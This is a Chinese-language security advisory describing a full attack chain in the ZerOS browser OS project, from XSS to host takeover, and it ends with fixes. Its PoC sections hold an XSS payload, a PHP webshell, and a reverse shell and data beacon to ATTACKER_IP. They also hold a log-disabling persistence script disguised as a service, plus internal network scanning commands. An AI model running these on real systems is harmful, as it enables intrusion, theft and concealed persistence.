# CVS-ZEROS-026: ZerOS 全攻击链 —— 从浏览器沙箱到宿主机完全控制及内网横向移动

**漏洞编号**: CVS-ZEROS-026  
**发现日期**: 2026-07-27  
**修复日期**: 待修复  
**发现者**: 小萱baibai  
**分析协助**: opencode / deepseek-v4-pro  
**严重程度**: 严重 (CVSS 9.8)  
**CWE分类**: CWE-284, CWE-863, CWE-441 (恶意代理), CWE-250 (不必要的权限执行), CWE-668 (暴露的危险方法)  
**状态**: 待修复

---

## 漏洞概述

本文档描述一条**完整的 APT 级攻击链**：从 ZerOS 浏览器实例中的普通应用权限开始，利用 CVS-ZEROS-023/024/025 漏洞链实现内核级控制，借助 NetworkManager 的全能力网络原语将攻击面扩展到宿主 PHP 服务、真实服务器文件系统，最终实现宿主机完全控制和内网横向移动。

**这不是一个单独的漏洞，而是对项目中多个已知/未知漏洞实现完整攻击链的分析。** 链中每一步都独立成立，但组合后形成从"虚拟 OS 中的低权限进程"到"真实服务器 root shell"的完整提权路径。

---

## 完整攻击链

### 阶段 1: ZerOS 内核劫持（023/024/025 组合）

```
普通应用 (CACHE_WRITE + NETWORK_ACCESS)
  → Cache 投毒 'system.dailyQuote' (programName='exploit')
  → LockScreen 锁屏触发 innerHTML XSS
  → XSS 在系统 UI 上下文中执行
  → POOL.__ADD__("KERNEL_GLOBAL_POOL", "PermissionManager", bypassAll)
  → POOL.__ADD__("KERNEL_GLOBAL_POOL", "NetworkManager", maliciousProxy)
  → 完整内核控制 ✓
```

### 阶段 2: 部署持久化载荷（CVS-ZEROS-022 路径）

```
内核控制权 (SERVER_SERVICE_PID = 10000)
  → FSDirve.php?action=write_file → 写入 D:/server/server-backdoor.js
  → ServerExpansion 自动扫描并 <script> 加载所有 server-*.js
  → 下次系统重启时自动执行
  → 持久化后门植入 ✓
```

### 阶段 3: NetworkManager 代理 → 宿主机网络突破

```
劫持后的 NetworkManager
  → Network.Port.register(任意端口) 
  → networkDirve.php 创建 0.0.0.0:{port} TCP 监听 (networkDirve.php:247)
  → popen("start /B php daemon.php") 启动持久化守护进程
  → 攻击者 Kali/Windows 机器通过该端口建立反向连接
  → ZerOS 实例变为内网跳板 ✓
```

### 阶段 4: PHP 后门写入宿主机文件系统

```
TCP 端口已开放
  → 攻击者通过该端口发送 Base64 编码的 PHP webshell
  → Network.Port.send 将数据路由到 FSDirve.php
  → 写入 D:/server/evil.php 到真实宿主机文件系统
  → 访问 http://host:8089/system/service/DISK/D/server/evil.php
  → PHP webshell 在宿主机上运行 ✓
```

### 阶段 5: 宿主机 Shell 获取

```
PHP webshell 在宿主机运行
  → 通过 nodeLibExec.php 的 proc_open 执行 node 子进程 (SystemToken 放行)
  → 通过 nodeLibInit.php 的 proc_open("npm install -g ...") 执行任意命令
  → 写入 crontab / 计划任务实现持久化
  → 部署反向 shell (bash -i >& /dev/tcp/attacker/4444 0>&1)
  → 宿主机完全控制 ✓
```

### 阶段 6: 内网横向移动与 WAF 绕过

```
宿主机 Shell
  → ifconfig → 发现内网网段 (172.16.x.x, 192.168.x.x, 10.x.x.x)
  → 该内网中所有 ZerOS 实例共享相同的缓存/POOL 漏洞面
  → 从宿主机向内网所有 ZerOS 实例发送 Cache 投毒请求:
      http://{internal_zerOS}:8089/...cache... → 复用 023/024/025 攻击
  → 非 ZerOS 系统:
      - 宿主机上的 nmap/masscan 扫描内网
      - 发现数据库、SSH、RDP、SMB 等服务
      - 使用 ZerOS 实例打开的端口作为 C2 通道
      - 传统内网渗透工具链 (Mimikatz, PSExec, ...)
  → WAF 无法检测: 流量来自内网受信任主机 ✓
```

---

## 技术细节

### 关键漏洞点映射

| 攻击步骤 | 利用的漏洞/机制 | 文件:行 |
|---------|---------------|---------|
| 缓存投毒 | Cache.set 允许 programName 覆盖 | `processManager.js:6175-6187` |
| 锁屏 XSS | Cache.get → innerHTML | `lockscreen.js:269` |
| 权限绕过 | EXPLOIT_PID 无条件放行 | `permissionManager.js:797-803` |
| POOL 劫持 | __ADD__ 零访问控制 | `pool.js:135` |
| 文件写入 | FSDirve.php write_file | `FSDirve.php:1310-1332` |
| D/server 自动加载 | ServerExpansion 自动扫描 | `serverExpansion.js:119-122` |
| 端口监听 | TCP 绑定 0.0.0.0 | `networkDirve.php:247` |
| 进程执行 | popen/exec/proc_open | `networkDirve.php:132`, `nodeLibExec.php:54` |
| 远程桥接 | server-zeroshub.php 已预埋 | `server-zeroshub.php:8` |
| CORS 全开 | Access-Control-Allow-Origin: * | `.htaccess:14` |

### NetworkManager 攻击面（内核劫持后可用）

```javascript
// 内核劫持后，NetworkManager 可被替换为恶意代理:
POOL.__ADD__("KERNEL_GLOBAL_POOL", "NetworkManager", {
    // 原始网络能力保留
    registerPort: original.registerPort,    // 绑定 0.0.0.0:PORT
    sendDataToPort: original.sendDataToPort, // 向任意 host:port 发送数据
    fetch: maliciousFetch,                   // 拦截/篡改所有 HTTP 流量
    
    // 新增: 打开反向 Shell 通道
    openReverseShell: (attackerHost, attackerPort) => { /* ... */ },
    
    // 新增: 内网扫描代理
    scanInternalNetwork: (subnet) => { /* ... */ }
});
```

### 宿主机逃逸关键代码路径

```php
// networkDirve.php:247 — 端口绑在 0.0.0.0（全接口）
$address = '0.0.0.0';
$socket = @stream_socket_server("tcp://{$address}:{$port}", ...);

// networkDirve.php:132 — 原生进程启动
$command = 'start /B php ' . escapeshellarg(DAEMON_SCRIPT);
pclose(popen($command, 'r'));

// nodeLibExec.php:54 — proc_open 执行 Node.js
$process = proc_open("node system/assets/nodeLibs/{$scriptId}.js 2>&1", ...);

// FSDirve.php:1310-1332 — 直接写入宿主机文件系统
file_put_contents($fullPath, $content);  // $fullPath = DISK_BASE_PATH . '/D/server/evil.php'
```

### server-zeroshub.php 预埋后门

```php
// system/service/DISK/D/server/server-zeroshub.php:8
define('ZEROSHUB_TOKEN', "zos_replace_me_regenerate_via_zeroshub_app");
```

该文件已预埋在 D:/server/ 目录，只需攻击者生成真实 token 即可激活完整的远程管理桥接，支持：
- `read_file` / `write_file` — 任意文件读写
- `start_program` / `kill_program` — 进程控制
- `list_processes` — 进程枚举
- `start_service` / `stop_service` — 服务管理
- `install_perflog` — 安装 D/server 模块

---

## 影响评估

### 直接影响范围

| 阶段 | 影响 | 级别 |
|------|------|------|
| ZerOS 内核劫持 | 虚拟 OS 完全控制 | 虚拟 OS 级 |
| NetworkManager 劫持 | 任意网络通信、端口绑定 0.0.0.0 | 网络级 |
| PHP webshell 写入 | 宿主机 PHP 代码执行 | 宿主机应用级 |
| proc_open 调用 | 宿主机原生命令执行 | 宿主机系统级 |
| 反向 Shell | 宿主机完全控制 | 宿主机 root 级 |
| 内网扫描 | 发现内网所有主机和服务 | 内网级 |
| 横向移动 | 攻陷内网全部 ZerOS 和非 ZerOS 系统 | 整个内网 |
| WAF 绕过 | 攻击流量来自内网受信任主机 | 边界防护失效 |

### CVSS 3.1 评分建议

- **AV**: Network (N) — 可通过 ZerOS 网络服务入口
- **AC**: Low (L) — 攻击链无复杂条件
- **PR**: Low (L) — 只需普通应用权限
- **UI**: Required (R) — 需触发锁屏；若用 024 直接 POOL 路径则为 None
- **S**: Changed (C) — 浏览器沙箱 → 宿主机 OS
- **C/I/A**: High / High / High (H/H/H)
- **向量**: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H -> **9.6 (严重)**

> 若利用 CVS-ZEROS-024 绕过锁屏 UI 步骤 (UI:R → UI:N)，评分为 **9.8**。

---

## 攻击 PoC（概念验证）

### 阶段 1-2: 植入持久化载荷

```javascript
// 在系统 UI XSS 上下文中执行:
const exploit = `
// 步骤 1: 保存原始模块引用
window._origPM = POOL.__GET__('KERNEL_GLOBAL_POOL', 'PermissionManager');

// 步骤 2: 替换权限管理器（全局放行）
POOL.__ADD__('KERNEL_GLOBAL_POOL', 'PermissionManager', {
    hasPermission: (pid, perm) => true,
    checkAndRequestPermission: (pid, perm) => Promise.resolve(true),
    PERMISSION: window._origPM.PERMISSION
});

// 步骤 3: 写入持久化后门到 D:/server/
(async () => {
    const backdoorCode = \`
(function() {
    // 启动反向 Shell
    const shell = new WebSocket('ws://ATTACKER_IP:4444');
    shell.onmessage = async (e) => {
        const cmd = JSON.parse(e.data);
        const result = await ProcessManager.callKernelAPI(
            10000, cmd.api, cmd.args
        );
        shell.send(JSON.stringify(result));
    };
})();
\`;

    await ProcessManager.callKernelAPI(10000, 'FileSystem.write', [
        'D:/server/server-backdoor.js', backdoorCode
    ]);
    // ServerExpansion 下次启动自动加载
})();
`;

// 将载荷写入缓存触发锁屏 XSS
kernelAPI.call('Cache.set', ['system.dailyQuote',
    `<img src=x onerror="eval(atob('${btoa(exploit)}'))">`,
    { programName: 'exploit', ttl: 0 }
]);
```

### 阶段 3-4: 打开反向通道 + PHP webshell

```javascript
// 通过已劫持的 NetworkManager:
const phpWebshell = `<?php system($_GET['cmd']); ?>`;
const b64Payload = btoa(phpWebshell);

// 写入 PHP webshell 到宿主机
await ProcessManager.callKernelAPI(10000, 'FileSystem.write', [
    'D:/server/shell.php',
    `<?php eval(base64_decode('${b64Payload}')); ?>`
]);

// 验证写入成功: 访问 http://target:8089/system/service/DISK/D/server/shell.php?cmd=whoami
```

### 阶段 5: 宿主机 Shell

```bash
# 攻击者 Kali 机器:
curl "http://target:8089/system/service/DISK/D/server/shell.php?cmd=whoami"
# → www-data / Administrator

curl "http://target:8089/system/service/DISK/D/server/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261'"
# → 反向 Shell 建立
```

### 阶段 6: 内网横向

```bash
# 通过已获取的宿主机 Shell:
# 1. 扫描内网
for i in $(seq 1 254); do
    curl -s --connect-timeout 2 "http://192.168.1.$i:8089/" | grep "ZerOS" && echo "ZerOS found: 192.168.1.$i"
done

# 2. 对发现的 ZerOS 实例重复 023/024/025 攻击
# 3. 对非 ZerOS 服务使用传统渗透工具
nmap -sV 192.168.1.0/24
```

---

## 关键攻击桥：NodeLib 无痕执行子系统

### 概述

NodeLib 是攻击链中从**虚拟 OS (浏览器)** 跨越到**真实宿主机 (OS 进程)** 的**唯一执行桥**。一旦攻击者通过 023/024/025 获得内核控制权，NodeLib 子系统提供了可被滥用的原生代码执行路径，且**几乎完全无审计追踪**。

### NodeLib 架构

```
[浏览器 JS]                              [PHP 后端]                    [宿主机 OS]
                                                      
NodeLibExpansion.run('perf')  ──fetch──→  nodeLibExec.php  ──proc_open──→  node perf.js
     │                                       │                              │
     │  SystemToken                          │  零日志                       │  完整 fs 权限
     │  (NetworkManager 自动注入)             │  bypass_shell: true           │  完整网络权限
     │                                       │                              │
NodeLibExpansion.           ──fetch──→  nodeLibInit.php  ──proc_open──→  npm install -g
  ensureNodeDependencies()                  │                              │
                                            │  bypass_shell: false         │  cmd.exe 解释
                                            │  零日志                       │
```

### 无痕攻击的关键要素

#### 1. PHP 后端零审计日志

`nodeLibExec.php` (123 行) 和 `nodeLibInit.php` (116 行) 的完整代码中**没有任何 `error_log()`、文件日志或审计记录**。对比 Java 后端 (`NodeLibExecController.java:38` 有 `log.info("[NodeLibExec] scriptId={}", scriptId)`)，PHP 实现是零追踪的。

```php
// nodeLibExec.php — 整个文件无一行日志代码
function runNodeCommand(array $command, $timeoutSec = 5) {
    $proc = proc_open($cmd, $descriptorSpec, $pipes);  // 无日志
    // ... 读取输出, 返回结果 ...                           // 无日志
}
```

#### 2. server-perflog.js 可禁用全系统动作日志

`dev/zeroshub/server/server-perflog.js:28-45` 展示了标准模式：D/server 模块可以**覆盖 `ProcessManager._logProgramAction`** 来静默禁用所有程序行为记录：

```javascript
ProcessManager._actionLoggingEnabled = false;
ProcessManager._logProgramAction = function(pid, action, details) {
    if (!ProcessManager._actionLoggingEnabled) return;
    return _originalLogAction.call(this, pid, action, details);
};
```

#### 3. NetworkManager JWT 自动注入 — 调用栈级别绕过

`networkManager.js:265-282` 基于**调用栈文件路径 regex 分析**自动选择 JWT 类型：

```javascript
_getJWTTypeForCaller() {
    if (!/\/DISK[\/\\]/i.test(norm)) return 'system';              // DISK之外 → SystemToken
    if (/\/DISK[\/\\]D[\/\\]server[\/\\]/i.test(norm)) return 'system'; // D/server → SystemToken
    return 'user';  // 其余 → UserToken
}
```

D/server 目录下的任何模块发出的 fetch 请求**自动携带 SystemToken**，无需显式传入认证头。`nodeLibExpansion.js` 的 fetch 调用也没有设置 Authorization — 完全依赖此自动注入。

#### 4. Node 子进程无磁盘隔离

`nodeLibExec.php` 的 `realpath()` + 前缀检查 (line 92-104) 仅约束 `.js` 脚本文件的定位路径，不约束 Node 进程运行时的能力：

```php
$scriptPath = realpath($baseDir . DIRECTORY_SEPARATOR . $scriptFile);
// 仅校验脚本路径, 但 node 进程可访问整个文件系统
```

Node 子进程通过 `require('fs')` 可读写宿主机**任意路径**（取决于 PHP 进程的用户权限），完全不受 ZerOS 虚拟 D: 盘边界限制。

#### 5. proc_open 参数安全但可扩展攻击面

| 参数 | nodeLibExec | nodeLibInit | 风险 |
|------|------------|-------------|------|
| `bypass_shell` | `true` (安全) | `false` (过 cmd.exe) | **中** — 若白名单被扩展包含特殊字符 |
| `$cwd` | `null` | `null` | 继承 PHP 工作目录 |
| `$env` | `null` | `null` | 继承 PHP 环境, 调用方不可控 |
| stdin | 打开后立即关闭 | 写入包名 | 无注入路径 |
| 白名单 | `['check', 'perf']` (2个) | `['systeminformation', 'node-system-stats', 'microstats']` (3个) | 当前窄, 但可被添加 |

#### 6. ServerExpansion 零完整性校验

`serverExpansion.js:119-122, 478-492` — 每次启动时扫描 `D:/server/server-*.js`，通过 `<script>` 标签全部加载。**无代码签名、无哈希校验、无 manifest 白名单**。

```javascript
// 仅验证文件名匹配 server-*.js 正则
const SERVER_FILE_PATTERN = /^server-(.+)\.js$/i;
// 之后直接 <script src=...> 执行, 顶级代码立即运行
```

### 无痕载荷示例

```javascript
// D:/server/server-silent.js — 通过 FSDirve 写入, 下次启动自动加载
(function() {
    // 1. 禁用全系统动作日志
    const orig = ProcessManager._logProgramAction;
    ProcessManager._actionLoggingEnabled = false;
    ProcessManager._logProgramAction = function() {};

    // 2. 利用 SERVER_SERVICE_PID 启动反向 Shell
    setInterval(async () => {
        try {
            await ProcessManager.callKernelAPI(10000, 'Network.Port.send', [{
                host: 'ATTACKER_IP',
                port: 4444,
                data: JSON.stringify({
                    hostname: window.location.hostname,
                    processes: await ProcessManager.callKernelAPI(10000, 'Process.getRunningProcesses'),
                    files: await ProcessManager.callKernelAPI(10000, 'FileSystem.list', ['D:/'])
                })
            }]);
        } catch(e) { /* 静默失败 */ }
    }, 30000);  // 每 30 秒上报

    // 3. 注册为合规服务 (通过 ServerExpansion 自检)
    window.__ZerOS_ServerExpansion_Register__({
        __init__: async () => {},
        __start__: async () => {},
        __stop__: async () => {},
        status: () => ({ running: true }),
        info: () => ({ name: 'system-monitor', version: '1.0.0' })
    });
})();
```

### NodeLib 攻击面总结

| 属性 | 状态 | 攻击价值 |
|------|------|---------|
| PHP 审计日志 | **零** | 无法追踪谁调用了 nodeLibExec |
| JS 动作日志 | 可禁用 (server-perflog 模式) | 无法追踪 server 模块行为 |
| 宿主文件系统 | Node 进程完整访问 | 读写任意宿主文件 |
| 宿主机进程 | proc_open 创建原生进程 | 执行任意系统命令 |
| 持久化 | 每次启动自动加载 | 重启后恢复 |
| 网络通信 | NetworkManager 全能力 | 内网扫描、横向移动、C2 通道 |
| 权限 | SERVER_SERVICE_PID (10000) | 所有内核权限无条件放行 |
| 检测难度 | 极高 | 伪装为合法系统服务 |

---

## 修复建议

### P0 — 立即修复（阻断攻击链关键节点）

1. **修复 CVS-ZEROS-023**: Cache API 强制使用真实调用者 PID 推导命名空间；锁屏 innerHTML 改为 textContent
2. **修复 CVS-ZEROS-025**: POOL.__ADD__ 对 KERNEL_GLOBAL_POOL 增加调用栈/模块来源认证
3. **修复 CVS-ZEROS-022**: D/server 自动加载增加签名/白名单校验
4. **修复 CVS-ZEROS-024**: tempAsset 启动时检查程序名不与 APPLICATION_ASSETS 冲突

### P1 — 高优先级（加固网络和宿主机边界）

5. **NetworkManager 端口监听改为 127.0.0.1**: `networkDirve.php:247` 改为 `$address = '127.0.0.1'`
6. **NetworkManager 增加目标白名单**: 发送数据前校验目标 host 是否在允许列表中
7. **移除或锁定 `server-zeroshub.php` 预埋文件**: 删除或设置 `chmod 000`
8. **CORS 收紧**: `.htaccess` 改为具体 Origin 白名单
9. **nodeLibExec/nodeLibInit 增加命令白名单**: 限制 `proc_open` 可执行的具体命令和参数
10. **D/server 目录权限**: 在生产部署中设置 PHP 用户对该目录只读

### P2 — 中优先级（纵深防御）

11. **审计所有 `proc_open`/`exec`/`popen` 调用点**: 评估每个的输入可控性
12. **部署 Web Application Firewall**: 对 PHP 端点增加请求频率限制和载荷检测
13. **网络隔离**: 将 ZerOS 服务运行在独立网络 namespace/容器中
14. **最小权限原则**: PHP 进程以最低权限用户运行，文件系统只开放必要目录

---

## 相关文件

- `kernel/process/processManager.js`
- `kernel/core/signal/pool.js`
- `kernel/drive/cacheDrive.js`
- `kernel/drive/networkManager.js`
- `kernel/process/permissionManager.js`
- `system/ui/lockscreen.js`
- `system/service/FSDirve.php`
- `system/service/networkDirve.php`
- `system/service/networkDirveDaemon.php`
- `system/service/nodeLibExec.php`
- `system/service/nodeLibInit.php`
- `system/service/DISK/D/server/server-zeroshub.php`
- `system/expansion/serverExpansion.js`
- `.htaccess`

### 关联漏洞

- `VULN/CVS_ZEROS_022.md` — D/server 服务脚本可写入并自动加载
- `VULN/CVS_ZEROS_023.md` — Cache API 命名空间投毒 + 锁屏 XSS
- `VULN/CVS_ZEROS_024.md` — tempAsset 程序名冲突 → 缓存劫持
- `VULN/CVS_ZEROS_025.md` — POOL.__ADD__ 零访问控制 → 内核模块劫持

---

**修复状态**: 待修复  
**发现者**: 小萱baibai  
**分析协助**: opencode / deepseek-v4-pro
